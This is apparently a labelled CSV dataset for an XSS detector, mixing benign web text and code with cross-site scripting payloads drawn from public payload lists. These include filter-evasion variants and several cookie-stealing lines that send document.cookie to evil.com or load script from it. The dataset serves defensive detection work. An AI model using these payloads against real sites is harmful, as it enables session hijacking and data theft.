"payload","label","type","source"
"<svg onload=alert('XSS')>","1","event_handler","OWASP/GitHub/wafpass/payloadbox"
"<frameset onload=alert(1)>","1","event_handler","OWASP/GitHub/wafpass/payloadbox"
"<iframe onload=alert(1)>","1","event_handler","OWASP/GitHub/wafpass/payloadbox"
"x"" oncut=alert(1)>","1","other_xss","OWASP/GitHub/wafpass/payloadbox"
"localStorage.setItem('theme', 'dark');","0","benign","normal_web_content"
"Please reset my password","0","benign","normal_web_content"
"<input type=hidden accesskey=x onclick=alert(1)>","1","event_handler","OWASP/GitHub/wafpass/payloadbox"
"<a href=javascript:alert(document.cookie)>click</a>","1","javascript_uri","OWASP/GitHub/wafpass/payloadbox"
"<script>throw onerror=alert,1337</script>","1","script_tag","OWASP/GitHub/wafpass/payloadbox"
"{""status"": ""success"", ""code"": 200}","0","benign","normal_web_content"
"SELECT COUNT(*) FROM products WHERE category = 'electronics'","0","benign","normal_web_content"
"<button type='submit' class='btn-primary'>Submit Form</button>","0","benign","normal_web_content"
"<svg/onload=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>","1","event_handler","OWASP/GitHub/wafpass/payloadbox"
"<a href='https://example.com' target='_blank' rel='noopener'>Visit Site</a>","0","benign","normal_web_content"
"<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>","1","event_handler","OWASP/GitHub/wafpass/payloadbox"
"'><script>alert(1)</script><'","1","other_xss","OWASP/GitHub/wafpass/payloadbox"
"xss(userInput)","0","benign","normal_web_content"
"<footer>© 2024 Company Name</footer>","0","benign","normal_web_content"
"<!DOCTYPE html>","0","benign","normal_web_content"
"top 10 movies 2024","0","benign","normal_web_content"
"<scRiPt>alert(1)</sCrIpT>","1","script_tag","OWASP/GitHub/wafpass/payloadbox"
"<header ondblclick=alert(1)>","1","other_xss","OWASP/GitHub/wafpass/payloadbox"
"import React, { useState } from 'react';","0","benign","normal_web_content"
"<a href='mailto:info@company.com' title='Send Email'>Contact Us</a>","0","benign","normal_web_content"
"<p class='text-muted small'>Last updated: January 2024</p>","0","benign","normal_web_content"
"I disagree with point number 3 in this post.","0","benign","normal_web_content"
"<canvas id='myChart' width='400' height='300'></canvas>","0","benign","normal_web_content"
"router.use('/api', rateLimit({ windowMs: 15*60*1000, max: 100 }));","0","benign","normal_web_content"
"db.collection('users').find({ active: true }).toArray()","0","benign","normal_web_content"
"<script src='/js/app.js' defer></script>","0","benign","normal_web_content"
"<div id=""x""></div><script>document.getElementById(""x"").innerHTML=""<b onmouseover=alert(1)>hover</b>""</script>","1","script_tag","OWASP/GitHub/wafpass/payloadbox"
"<embed src=javascript:alert(1)>","1","javascript_uri","OWASP/GitHub/wafpass/payloadbox"
"SELECT * FROM users WHERE id = ?","0","benign","normal_web_content"
"<x contenteditable onblur=alert(1)>","1","event_handler","OWASP/GitHub/wafpass/payloadbox"
"escapeHtml(text)","0","benign","normal_web_content"
"<meta http-equiv=refresh content=0;url=javascript:alert(1)>","1","javascript_uri","OWASP/GitHub/wafpass/payloadbox"
"Feature request: add dark mode support.","0","benign","normal_web_content"
"\u003cscript\u003ealert(1)\u003c/script\u003e","1","encoded","OWASP/GitHub/wafpass/payloadbox"
"```python
print('Hello World')
```","0","benign","normal_web_content"
"?page=1&limit=20","0","benign","normal_web_content"
"<article class='blog-post'>","0","benign","normal_web_content"
"<label for='email'>Email Address:</label>","0","benign","normal_web_content"
"strip_tags($html)","0","benign","normal_web_content"
"<img src= onerror=alert(1)>","1","img_tag","OWASP/GitHub/wafpass/payloadbox"
"<section class='hero-section'>","0","benign","normal_web_content"
"<label onmousedown='alert(1)'>label</label>","1","event_handler","OWASP/GitHub/wafpass/payloadbox"
"<progress value='70' max='100'>70%</progress>","0","benign","normal_web_content"
"<&#115;cript>alert(1)</&#115;cript>","1","encoded","OWASP/GitHub/wafpass/payloadbox"
"validator.isEmail(email)","0","benign","normal_web_content"
"<script>frames[0].alert(1)</script>","1","script_tag","OWASP/GitHub/wafpass/payloadbox"
"{""username"": ""johndoe"", ""role"": ""admin""}","0","benign","normal_web_content"
"<script>document.location='https://evil.com?c='+document.cookie</script>","1","script_tag","OWASP/GitHub/wafpass/payloadbox"
"res.status(200).json({ success: true, data: result });","0","benign","normal_web_content"
"<textarea name='message' rows='4'>Type your message here</textarea>","0","benign","normal_web_content"
"<SCRIPT/XSS SRC=""http://evil.com/xss.js""></SCRIPT>","1","script_tag","OWASP/GitHub/wafpass/payloadbox"
"<IMG SRC=""jav&#x0A;ascript:alert('XSS');"">","1","img_tag","OWASP/GitHub/wafpass/payloadbox"
"<svg><script>&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;</script></svg>","1","svg_injection","OWASP/GitHub/wafpass/payloadbox"
"<body onpopstate=alert(1)><a href=#>push</a>","1","event_handler","OWASP/GitHub/wafpass/payloadbox"
"I love programming in Python","0","benign","normal_web_content"
"strip_tags($html)","0","benign","normal_web_content"
"<IMG SRC=x OnErRoR=alert(1)>","1","event_handler","OWASP/GitHub/wafpass/payloadbox"
"</script><svg onload=alert(1)>","1","event_handler","OWASP/GitHub/wafpass/payloadbox"
"' onmouseover='alert(1)'","1","event_handler","OWASP/GitHub/wafpass/payloadbox"
"¼script¾alert(¢XSS¢)¼/script¾","1","other_xss","OWASP/GitHub/wafpass/payloadbox"
"Hi there! Welcome to our newsletter.","0","benign","normal_web_content"
"<blockquote cite='source'>Quote text here</blockquote>","0","benign","normal_web_content"
"top 10 movies 2024","0","benign","normal_web_content"
"var name = 'John';","0","benign","normal_web_content"
"<script>new Function('alert(1)')()</script>","1","script_tag","OWASP/GitHub/wafpass/payloadbox"
"weather forecast Ho Chi Minh City","0","benign","normal_web_content"
"useEffect(() => { fetchData(); }, [userId]);","0","benign","normal_web_content"
"const arr = [1, 2, 3, 4, 5];","0","benign","normal_web_content"
"<ruby oncopy=alert(1)>","1","other_xss","OWASP/GitHub/wafpass/payloadbox"
"<table class='data-table'><thead><tr><th>Name</th></tr></thead></table>","0","benign","normal_web_content"
""" style=""animation-name:slidein"" onanimationstart=""alert(1)","1","other_xss","OWASP/GitHub/wafpass/payloadbox"
"<svg onload=""eval(String.fromCharCode(97,108,101,114,116,40,49,41))"">","1","svg_injection","OWASP/GitHub/wafpass/payloadbox"
"<%2Fscript><script>alert(1)<%2Fscript>","1","script_tag","OWASP/GitHub/wafpass/payloadbox"
"<math href=javascript:alert(1)>","1","javascript_uri","OWASP/GitHub/wafpass/payloadbox"
"Your password was changed successfully.","0","benign","normal_web_content"
"<img src=1 onerror=alert(document.domain)>","1","event_handler","OWASP/GitHub/wafpass/payloadbox"
"<audio src=x onerror=alert(1)>","1","event_handler","OWASP/GitHub/wafpass/payloadbox"
"Nike shoes size 42","0","benign","normal_web_content"
"helmet()","0","benign","normal_web_content"
"</noscript><script>alert(1)</script>","1","script_tag","OWASP/GitHub/wafpass/payloadbox"
"<img src='profile.jpg' alt='User profile picture'>","0","benign","normal_web_content"
"<svg/onload=""window[](1)"">","1","svg_injection","OWASP/GitHub/wafpass/payloadbox"
"<audio onloadstart=alert(1)>","1","event_handler","OWASP/GitHub/wafpass/payloadbox"
"<meta name='description' content='A website about web development'>","0","benign","normal_web_content"
"<p>Welcome to our website!</p>","0","benign","normal_web_content"
"<script>alert(document.cookie)</script>","1","script_tag","OWASP/GitHub/wafpass/payloadbox"
"<<script>alert(""XSS"");//<</SCRIPT>","1","script_tag","OWASP/GitHub/wafpass/payloadbox"
"<code>npm install package-name</code>","0","benign","normal_web_content"
"<hr onclick=alert(1)>","1","event_handler","OWASP/GitHub/wafpass/payloadbox"
"<script>/*<![CDATA[*/alert(1)/*]]>*/</script>","1","script_tag","OWASP/GitHub/wafpass/payloadbox"
"<svg><set onbegin=alert(1) attributeName=x>","1","svg_injection","OWASP/GitHub/wafpass/payloadbox"
"<scri
pt>alert(1)</scri
pt>","1","encoded","OWASP/GitHub/wafpass/payloadbox"
"Please fix the bug on the checkout page.","0","benign","normal_web_content"
"<blockquote onresize=alert(1)>","1","other_xss","OWASP/GitHub/wafpass/payloadbox"
"&lt;script&gt;alert(1)&lt;/script&gt;","1","other_xss","OWASP/GitHub/wafpass/payloadbox"
"<svg onload=""javascript:void(alert(1))"">","1","svg_injection","OWASP/GitHub/wafpass/payloadbox"
"<div style=""background:url(javascript:alert(1))"">","1","javascript_uri","OWASP/GitHub/wafpass/payloadbox"
"<html lang='en'>","0","benign","normal_web_content"
"');alert(1)//","1","other_xss","OWASP/GitHub/wafpass/payloadbox"
"<div onpointerdown=alert(1)>hover</div>","1","event_handler","OWASP/GitHub/wafpass/payloadbox"
"<track src=x onerror=alert(1)>","1","event_handler","OWASP/GitHub/wafpass/payloadbox"
"<bgsound src=javascript:alert(1)>","1","javascript_uri","OWASP/GitHub/wafpass/payloadbox"
"Dear Customer, your order has been confirmed.","0","benign","normal_web_content"
"<textarea name='message' rows='4'>Type your message here</textarea>","0","benign","normal_web_content"
"Hello, my name is Nguyen Van A","0","benign","normal_web_content"
"<script language=javascript>alert(1)</script>","1","script_tag","OWASP/GitHub/wafpass/payloadbox"
"String(userInput).replace(/[<>""']/g, '')","0","benign","normal_web_content"
"<script type=text/javascript>alert(1)</script>","1","script_tag","OWASP/GitHub/wafpass/payloadbox"
"<form action='/login' method='post'>","0","benign","normal_web_content"
"<link rel=stylesheet href=javascript:alert(1)>","1","javascript_uri","OWASP/GitHub/wafpass/payloadbox"
"</style><script>alert(1)</script>","1","script_tag","OWASP/GitHub/wafpass/payloadbox"
"<script>document.querySelector(""#search"").value='<img src=x onerror=alert(1)>'</script>","1","script_tag","OWASP/GitHub/wafpass/payloadbox"
"fetch('/api/users').then(r => r.json()).then(data => console.log(data));","0","benign","normal_web_content"
"<h1>Page Title</h1>","0","benign","normal_web_content"
"const user = { id: 1, email: 'user@example.com' };","0","benign","normal_web_content"
"Great tutorial! Very helpful for beginners.","0","benign","normal_web_content"
"<svg onload=alert(document.cookie)>","1","event_handler","OWASP/GitHub/wafpass/payloadbox"
"<script>RegExp.prototype.toString=function(){alert(1);return""""}</script>","1","script_tag","OWASP/GitHub/wafpass/payloadbox"
"Please contact support@company.com","0","benign","normal_web_content"
"<script>eval('alert(1)')</script>","1","script_tag","OWASP/GitHub/wafpass/payloadbox"
"<script>alert(3)</script>","1","script_tag","OWASP/GitHub/wafpass/payloadbox"
"return <div className='card'><h2>{title}</h2><p>{content}</p></div>","0","benign","normal_web_content"
"My phone number is 0901234567","0","benign","normal_web_content"
"<input onchange='alert(1)' value='change me'>","1","event_handler","OWASP/GitHub/wafpass/payloadbox"
"@Html.Encode(Model.Description)","0","benign","normal_web_content"
"```python
print('Hello World')
```","0","benign","normal_web_content"
"machine learning tutorial for beginners","0","benign","normal_web_content"
"javascript:alert(document.cookie)","1","javascript_uri","OWASP/GitHub/wafpass/payloadbox"
"The total amount is $99.99","0","benign","normal_web_content"
"<keygen autofocus onfocus=alert(1)>","1","event_handler","OWASP/GitHub/wafpass/payloadbox"
"<style>@import'javascript:alert(1)'</style>","1","javascript_uri","OWASP/GitHub/wafpass/payloadbox"
"<p ondblclick='alert(1)'>double click</p>","1","event_handler","OWASP/GitHub/wafpass/payloadbox"
"Total: 1,234,567 records","0","benign","normal_web_content"
"<img src='logo.png' width='200' height='100' alt='Company Logo'>","0","benign","normal_web_content"
"<textarea autofocus onfocus=alert(1)>","1","event_handler","OWASP/GitHub/wafpass/payloadbox"
"<script>onerror=alert;throw 1</script>","1","script_tag","OWASP/GitHub/wafpass/payloadbox"
""";alert(1)//","1","other_xss","OWASP/GitHub/wafpass/payloadbox"
"const hash = await bcrypt.hash(password, 10);","0","benign","normal_web_content"
"<a href=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==>click</a>","1","other_xss","OWASP/GitHub/wafpass/payloadbox"
"jaVasCript:/*-/*`/*\`/*'/*""/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>","1","event_handler","OWASP/GitHub/wafpass/payloadbox"
"404 - Page Not Found","0","benign","normal_web_content"
"## Introduction
This is a **bold** statement.","0","benign","normal_web_content"
"INSERT INTO orders (user_id, product_id) VALUES (?, ?)","0","benign","normal_web_content"
"<a onmouseover=alert(1)>hover</a>","1","event_handler","OWASP/GitHub/wafpass/payloadbox"
"<div oncontextmenu='alert(1)'>right click</div>","1","event_handler","OWASP/GitHub/wafpass/payloadbox"
"<svg><image href=x onerror=alert(1)>","1","svg_injection","OWASP/GitHub/wafpass/payloadbox"
"<script>window.onload=function(){alert(1)}</script>","1","script_tag","OWASP/GitHub/wafpass/payloadbox"
"<script>var x='ale'+'rt'; window[x](1)</script>","1","script_tag","OWASP/GitHub/wafpass/payloadbox"
"Progress: 75% complete","0","benign","normal_web_content"
"<body onload=alert(document.cookie)>","1","event_handler","OWASP/GitHub/wafpass/payloadbox"
"<img src=x onerror=alert`1`>","1","event_handler","OWASP/GitHub/wafpass/payloadbox"
"<td onmouseleave='alert(1)'>cell</td>","1","event_handler","OWASP/GitHub/wafpass/payloadbox"
"<svg><math><mtext></math><script>alert(1)</script>","1","svg_injection","OWASP/GitHub/wafpass/payloadbox"
"</textarea><script>alert(1)</script>","1","script_tag","OWASP/GitHub/wafpass/payloadbox"
"<embed src=x onerror=alert(1)>","1","event_handler","OWASP/GitHub/wafpass/payloadbox"
"helmet()","0","benign","normal_web_content"
"x"" onpaste=alert(1)>","1","other_xss","OWASP/GitHub/wafpass/payloadbox"
"What is the weather today?","0","benign","normal_web_content"
"?q=hello+world","0","benign","normal_web_content"
"cheap flights Hanoi to Da Nang","0","benign","normal_web_content"
"<section class='hero-section'>","0","benign","normal_web_content"
"<svg><animate onbegin=alert(1) attributeName=x dur=1s>","1","svg_injection","OWASP/GitHub/wafpass/payloadbox"
"Order #12345 has been shipped","0","benign","normal_web_content"
"The total amount is $99.99","0","benign","normal_web_content"
"Thank you for your purchase!","0","benign","normal_web_content"
"useEffect(() => { fetchData(); }, [userId]);","0","benign","normal_web_content"
"<pre><code>git commit -m 'initial commit'</code></pre>","0","benign","normal_web_content"
"throw new Error('Invalid input: value must be a positive number');","0","benign","normal_web_content"
"<video onloadstart=alert(1)><source>","1","event_handler","OWASP/GitHub/wafpass/payloadbox"
"<abbr title='HyperText Markup Language'>HTML</abbr>","0","benign","normal_web_content"
"%3Cscript%3Ealert(1)%3C/script%3E","1","encoded","OWASP/GitHub/wafpass/payloadbox"
"app.get('/api/users', authenticate, async (req, res) => { ... });","0","benign","normal_web_content"
"<form onreset='alert(1)'><input type='reset'></form>","1","event_handler","OWASP/GitHub/wafpass/payloadbox"
"<div onpointermove=alert(1)>move</div>","1","event_handler","OWASP/GitHub/wafpass/payloadbox"
"console.error('Failed to load:', error.message);","0","benign","normal_web_content"
"<DIV STYLE=""width: expression(alert('XSS'));"">","1","other_xss","OWASP/GitHub/wafpass/payloadbox"
"<img src='profile.jpg' alt='User profile picture'>","0","benign","normal_web_content"
"<frame onload=alert(1)>","1","event_handler","OWASP/GitHub/wafpass/payloadbox"
"<col oncut=alert(1)>","1","other_xss","OWASP/GitHub/wafpass/payloadbox"
"DOMPurify.sanitize(htmlString)","0","benign","normal_web_content"
"body { font-family: Arial, sans-serif; background-color: #fff; }","0","benign","normal_web_content"
"<xss onafterscriptexecute=alert(1)><script>1</script>","1","script_tag","OWASP/GitHub/wafpass/payloadbox"
"<input type='text' name='username' placeholder='Enter username'>","0","benign","normal_web_content"
"SELECT * FROM users WHERE id = ?","0","benign","normal_web_content"
"how to cook pho","0","benign","normal_web_content"
"{{ variable | safe }}","0","benign","normal_web_content"
"function greet(name) { return 'Hello, ' + name; }","0","benign","normal_web_content"
"<footer onclick=alert(1)>","1","event_handler","OWASP/GitHub/wafpass/payloadbox"
"sanitizeHtml(userInput, { allowedTags: [], allowedAttributes: {} })","0","benign","normal_web_content"
"<select name='country'><option value='vn'>Vietnam</option></select>","0","benign","normal_web_content"
"<script>confirm('XSS')</script>","1","script_tag","OWASP/GitHub/wafpass/payloadbox"
"<script>alert(2)</script>","1","script_tag","OWASP/GitHub/wafpass/payloadbox"
"<svg xmlns=""http://www.w3.org/2000/svg"" onload=""alert(1)"">","1","svg_injection","OWASP/GitHub/wafpass/payloadbox"
"""><script>alert(1)</script><""","1","other_xss","OWASP/GitHub/wafpass/payloadbox"
"var name = 'John';","0","benign","normal_web_content"
"Warning: This action cannot be undone","0","benign","normal_web_content"
"@Html.Encode(Model.Description)","0","benign","normal_web_content"
"Meeting scheduled for 2024-01-15","0","benign","normal_web_content"
"%3Csvg%20onload%3Dalert(1)%3E","1","encoded","OWASP/GitHub/wafpass/payloadbox"
"<button onmouseover='alert(1)'>hover</button>","1","event_handler","OWASP/GitHub/wafpass/payloadbox"
"{""items"": [1, 2, 3], ""total"": 3}","0","benign","normal_web_content"
"<video src=x onerror=alert(1)>","1","event_handler","OWASP/GitHub/wafpass/payloadbox"
"JSON.parse('{""key"": ""value""}');","0","benign","normal_web_content"
"--><script>alert(1)</script><!--","1","other_xss","OWASP/GitHub/wafpass/payloadbox"
"<script>onbeforeunload=alert</script>","1","event_handler","OWASP/GitHub/wafpass/payloadbox"
".btn { padding: 10px 20px; border-radius: 4px; cursor: pointer; }","0","benign","normal_web_content"
""" onmouseover=alert(1) ""","1","event_handler","OWASP/GitHub/wafpass/payloadbox"
"<script>new Image().src='http://evil.com/?c='+document.cookie</script>","1","script_tag","OWASP/GitHub/wafpass/payloadbox"
"<img src='logo.png' width='200' height='100' alt='Company Logo'>","0","benign","normal_web_content"
"<script>document.getElementById(""x"").innerHTML=""<script>alert(1)<\/script>""</script>","1","script_tag","OWASP/GitHub/wafpass/payloadbox"
"document.getElementById('myId').textContent = 'Hello';","0","benign","normal_web_content"
"<nav><ul><li><a href='/home'>Home</a></li></ul></nav>","0","benign","normal_web_content"
"Please reset my password","0","benign","normal_web_content"
"<script>/* XSS */alert(1);</script>","1","script_tag","OWASP/GitHub/wafpass/payloadbox"
"<script>document.body.innerHTML='<img src=x onerror=alert(1)>'</script>","1","script_tag","OWASP/GitHub/wafpass/payloadbox"
"const handleSubmit = (e) => { e.preventDefault(); sendData(); };","0","benign","normal_web_content"
"<body onload=alert(1)>","1","event_handler","OWASP/GitHub/wafpass/payloadbox"
"Error: File not found","0","benign","normal_web_content"
"<noscript><p title=""</noscript><script>alert(1)</script>"">","1","script_tag","OWASP/GitHub/wafpass/payloadbox"
"<div class='container'>Hello World</div>","0","benign","normal_web_content"
"<details><summary>Click to expand</summary>Hidden content here</details>","0","benign","normal_web_content"
"content_tag(:p, user_input, escape: true)","0","benign","normal_web_content"
"<script>window['alert'](1)</script>","1","script_tag","OWASP/GitHub/wafpass/payloadbox"
"<header class='site-header'>","0","benign","normal_web_content"
"<script >//alert(1)</script>","1","script_tag","OWASP/GitHub/wafpass/payloadbox"
"cheap flights Hanoi to Da Nang","0","benign","normal_web_content"
"?id=45&action=view","0","benign","normal_web_content"
"const handleSubmit = (e) => { e.preventDefault(); sendData(); };","0","benign","normal_web_content"
"<script>{onerror=alert}throw 1</script>","1","script_tag","OWASP/GitHub/wafpass/payloadbox"
"x"" oncopy=alert(1)>","1","other_xss","OWASP/GitHub/wafpass/payloadbox"
"<img src=y onerror=alert(1)>","1","img_tag","OWASP/GitHub"
"<img src=x onerror=alert(document.location)>","1","img_tag","OWASP/GitHub/wafpass/payloadbox"
"htmlspecialchars($input, ENT_QUOTES, 'UTF-8')","0","benign","normal_web_content"
"<IMG SRC=x ONERROR=alert(1)>","1","img_tag","OWASP/GitHub"
"<article class='blog-post'>","0","benign","normal_web_content"
"<section onfocus=alert(1)>","1","event_handler","OWASP/GitHub/wafpass/payloadbox"
"You have 3 new notifications.","0","benign","normal_web_content"
"let result = arr.filter(x => x > 2);","0","benign","normal_web_content"
"SELECT name, email FROM customers LIMIT 10","0","benign","normal_web_content"
"&#60;script&#62;alert(1)&#60;/script&#62;","1","encoded","OWASP/GitHub/wafpass/payloadbox"
"<script>alert(1)</script>","1","encoded","OWASP/GitHub/wafpass/payloadbox"
"<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert(""XSS"")>","1","event_handler","OWASP/GitHub/wafpass/payloadbox"
"{{ variable | escape }}","0","benign","normal_web_content"
"<IMG SRC=""jav&#x0D;ascript:alert('XSS');"">","1","img_tag","OWASP/GitHub/wafpass/payloadbox"
"<source src=x onerror=alert(1)>","1","event_handler","OWASP/GitHub/wafpass/payloadbox"
"'-alert(1)//","1","other_xss","OWASP/GitHub/wafpass/payloadbox"
"<tr onmouseout='alert(1)'><td>row</td></tr>","1","event_handler","OWASP/GitHub/wafpass/payloadbox"
"?sort=price_asc&filter=available","0","benign","normal_web_content"
"<!DOCTYPE html>","0","benign","normal_web_content"
"Steps to reproduce: 1. Open app 2. Click button 3. See error","0","benign","normal_web_content"
"<script>Function(""alert(1)"")()</script>","1","script_tag","OWASP/GitHub/wafpass/payloadbox"
"What is the weather today?","0","benign","normal_web_content"
"<script src=//evil.com/xss.js></script>","1","script_tag","OWASP/GitHub/wafpass/payloadbox"
"?from=2024-01-01&to=2024-12-31","0","benign","normal_web_content"
"<img src='#' onmouseover='alert(1)'>","1","event_handler","OWASP/GitHub/wafpass/payloadbox"
"<td background=javascript:alert(1)>","1","javascript_uri","OWASP/GitHub/wafpass/payloadbox"
"<svg><script>alert(1)</script></svg>","1","script_tag","OWASP/GitHub/wafpass/payloadbox"
"<li onmouseenter='alert(1)'>item</li>","1","event_handler","OWASP/GitHub/wafpass/payloadbox"
"<script>alert(String.fromCharCode(88,83,83))</script>","1","script_tag","OWASP/GitHub/wafpass/payloadbox"
"<STYLE TYPE=""text/javascript"">alert('XSS');</STYLE>","1","other_xss","OWASP/GitHub/wafpass/payloadbox"
"how to learn python programming","0","benign","normal_web_content"
"?sort=price_asc&filter=available","0","benign","normal_web_content"
"<IMG SRC=""jav&#x0A;ascript:alert('XSS');"">","1","img_tag","OWASP/GitHub/wafpass/payloadbox"
"<base href=javascript:alert(1)//>","1","javascript_uri","OWASP/GitHub/wafpass/payloadbox"
"<script>alert(document.domain)</script>","1","script_tag","OWASP/GitHub/wafpass/payloadbox"
"<th ondrag=alert(1)>","1","event_handler","OWASP/GitHub/wafpass/payloadbox"
"db.collection('users').find({ active: true }).toArray()","0","benign","normal_web_content"
"const hash = await bcrypt.hash(password, 10);","0","benign","normal_web_content"
"htmlspecialchars($input, ENT_QUOTES, 'UTF-8')","0","benign","normal_web_content"
"const date = new Date();","0","benign","normal_web_content"
"%253Cscript%253Ealert(1)%253C%252Fscript%253E","1","encoded","OWASP/GitHub/wafpass/payloadbox"
"document.getElementById('myId').textContent = 'Hello';","0","benign","normal_web_content"
"<script>parent.alert(1)</script>","1","script_tag","OWASP/GitHub/wafpass/payloadbox"
"<s&#99;ript>alert(1)</s&#99;ript>","1","encoded","OWASP/GitHub/wafpass/payloadbox"
"machine learning tutorial for beginners","0","benign","normal_web_content"
"Response.Write(Server.HtmlEncode(userInput))","0","benign","normal_web_content"
"]><script>alert(1)</script>","1","other_xss","OWASP/GitHub/wafpass/payloadbox"
"Hi there! Welcome to our newsletter.","0","benign","normal_web_content"
"<select name='country'><option value='vn'>Vietnam</option></select>","0","benign","normal_web_content"
"&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;","1","encoded","OWASP/GitHub/wafpass/payloadbox"
"javascript:alert(1)","1","javascript_uri","OWASP/GitHub/wafpass/payloadbox"
"<object data=javascript:alert(1)>","1","javascript_uri","OWASP/GitHub/wafpass/payloadbox"
"<svg><foreignObject><iframe src=javascript:alert(1)></svg>","1","svg_injection","OWASP/GitHub/wafpass/payloadbox"
"<script>alert`1`</script>","1","script_tag","OWASP/GitHub/wafpass/payloadbox"
"<nav><ul><li><a href='/home'>Home</a></li></ul></nav>","0","benign","normal_web_content"
"<img src=z onerror=alert(document.cookie)>","1","img_tag","OWASP/GitHub"
"<Script>alert(1)</Script>","1","script_tag","OWASP/GitHub/wafpass/payloadbox"
"<div ontouchstart=alert(1)>touch</div>","1","event_handler","OWASP/GitHub/wafpass/payloadbox"
"Success: Your changes have been saved","0","benign","normal_web_content"
".container { max-width: 1200px; margin: 0 auto; }","0","benign","normal_web_content"
"<svg><use href=""data:image/svg+xml,<svg id='x'><image onerror='alert(1)'/></svg>#x"">","1","svg_injection","OWASP/GitHub/wafpass/payloadbox"
"<img src=x onerror=""window.location='http://evil.com'+document.cookie"">","1","img_tag","OWASP/GitHub/wafpass/payloadbox"
"localStorage.setItem('theme', 'dark');","0","benign","normal_web_content"
"<table background=javascript:alert(1)>","1","javascript_uri","OWASP/GitHub/wafpass/payloadbox"
"<img src=x onerror=alert(1)>","1","event_handler","OWASP/GitHub/wafpass/payloadbox"
